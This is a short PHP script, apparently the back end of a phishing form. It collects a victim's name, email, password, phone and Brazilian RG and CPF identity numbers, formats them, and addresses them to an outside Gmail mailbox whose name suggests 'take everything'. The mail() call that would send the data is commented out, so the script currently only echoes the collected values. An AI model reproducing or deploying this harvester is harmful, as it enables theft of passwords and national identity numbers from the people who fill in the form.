<?php
$destinatario = "666levatudo@gmail.com";

$nome = $_REQUEST['nome'];
$email = $_REQUEST['email'];
$senha = $_REQUEST['senha'];
$telefone = $_REQUEST['telefone'];
$rg = $_REQUEST['rg'];
$cpf = $_REQUEST['cpf'];

$body = "_____________________________________" . "<br>";
$body = $body . "<STRONG>OLÁ, SEUS DADOS SÃO:</STRONG>" . "<br>";
$body = $body . "NOME: " . $nome . "<br>";
$body = $body . "EMAIL: " . $email . "<br>";
$body = $body . "SENHA: " . $senha . "<br>";
$body = $body . "TELEFONE: " . $telefone . "<br>";
$body = $body . "RG: " . $rg . "<br>";
$body = $body . "CPF: " . $cpf . "<br>";
$body = $body . "_____________________________________" . "<br>";

#header("From: enviar.php");
# enviando o email
#mail($destinatario, $body);

echo $body;

?>